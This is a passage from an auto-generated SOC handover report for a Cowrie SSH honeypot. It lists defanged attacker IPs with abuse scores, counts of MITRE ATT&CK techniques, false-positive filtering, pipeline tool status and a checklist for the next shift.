| `18.119.13[.]69` | US | Amazon Technologies Inc. | **100** ⚠️ | 40 |
| `150.107.36[.]236` | US | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 50 |
| `36.89.252[.]106` | ID | PT Telekomunikasi Indonesia | **100** ⚠️ | 21 |
| `66.132.195[.]88` | US | Censys, Inc. | **100** ⚠️ | 48 |
| `221.122.121[.]219` | CN | Beijing flash newsletter cas telecommunication | **100** ⚠️ | 24 |
| `139.19.117[.]130` | DE | Max-Planck-Institut fuer Informatik | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 36 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 9 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 7 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 5 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 4 |

---

## 🔕 False Positive Summary (8 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 14 below threshold 25 | 2 |
| AbuseIPDB score 21 below threshold 25 | 2 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 101 cases |
| Tool 34  | Credential Extractor        | ✅ 17 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 22 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 8 filtered (7.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 19 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 9 priority case(s) shown individually · 15 recon entry/entries in table (8 group(s) consolidating 77 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-19T21:23:45Z_
